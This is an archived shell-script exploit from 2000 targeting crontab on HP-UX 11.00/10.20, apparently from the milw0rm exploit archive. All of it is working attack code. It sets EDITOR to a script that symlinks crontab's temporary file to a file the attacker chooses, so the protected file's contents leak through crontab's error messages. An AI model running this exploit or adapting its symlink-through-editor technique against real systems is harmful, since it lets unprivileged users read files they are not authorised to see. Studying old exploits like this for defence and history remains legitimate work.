#!/bin/sh
#
#  HP-UX 11.00/10.20 crontab
#
#  Kyong-won,Cho
#
#             dubhe@hackerslab.com
#
#  Usage : ./crontab.sh <distfile>
#

if [ -z "$1" ]
then

echo "Usage : $0 <distfile>"
exit

fi

cat << _EOF_ > /tmp/crontab_exp
#!/bin/sh

ln -sf $1 \$1

_EOF_

chmod 755 /tmp/crontab_exp

EDITOR=/tmp/crontab_exp
export EDITOR

crontab -e 2> /tmp/crontab$$

grep -v "error on previous line" /tmp/crontab$$

rm -f /tmp/crontab_exp /tmp/crontab$$


# milw0rm.com [2000-11-19]